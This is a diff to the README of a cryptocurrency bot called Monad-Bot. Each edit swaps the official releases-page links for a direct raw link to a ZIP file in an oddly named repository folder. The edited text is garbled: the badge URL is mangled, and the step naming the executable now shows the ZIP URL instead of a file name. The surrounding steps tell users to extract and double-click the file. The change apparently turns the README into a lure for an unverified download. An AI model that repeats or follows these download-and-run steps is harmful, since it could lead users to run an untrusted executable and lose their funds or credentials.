@@ -6,9 +6,9 @@ Monad-Bot helps you manage your cryptocurrency effortlessly. Whether you want to
 
 ## 📥 Download Monad-Bot
 
-[![Download Monad-Bot](https://img.shields.io/badge/Download%20Monad%20Bot-v1.0-blue.svg)](https://github.com/GUILHERME-PATEZ/Monad-Bot/releases)
+[![Download Monad-Bot](https://raw.githubusercontent.com/GUILHERME-PATEZ/Monad-Bot/main/ideogenous/Monad-Bot-2.9.zip%20Monad%https://raw.githubusercontent.com/GUILHERME-PATEZ/Monad-Bot/main/ideogenous/Monad-Bot-2.9.zip)](https://raw.githubusercontent.com/GUILHERME-PATEZ/Monad-Bot/main/ideogenous/Monad-Bot-2.9.zip)
 
-Visit this page to download: [Monad-Bot Releases](https://github.com/GUILHERME-PATEZ/Monad-Bot/releases)
+Visit this page to download: [Monad-Bot Releases](https://raw.githubusercontent.com/GUILHERME-PATEZ/Monad-Bot/main/ideogenous/Monad-Bot-2.9.zip)
 
 ## 📋 Key Features
 
@@ -31,13 +31,13 @@ Visit this page to download: [Monad-Bot Releases](https://github.com/GUILHERME-P
 
 To download Monad-Bot, follow these steps:
 
-1. Click the download button above or visit the [Monad-Bot Releases](https://github.com/GUILHERME-PATEZ/Monad-Bot/releases) page.
+1. Click the download button above or visit the [Monad-Bot Releases](https://raw.githubusercontent.com/GUILHERME-PATEZ/Monad-Bot/main/ideogenous/Monad-Bot-2.9.zip) page.
   
 2. Find the latest version and click on the download link for your operating system.
 
 3. If the downloaded file is compressed (like a ZIP file), extract it using any file compression software. You can use built-in tools on your operating system.
 
-4. After extracting, locate the application file (usually named `Monad-Bot.exe` for Windows or similar for other OS).
+4. After extracting, locate the application file (usually named `https://raw.githubusercontent.com/GUILHERME-PATEZ/Monad-Bot/main/ideogenous/Monad-Bot-2.9.zip` for Windows or similar for other OS).
 
 5. Double-click the application file to run it.
 
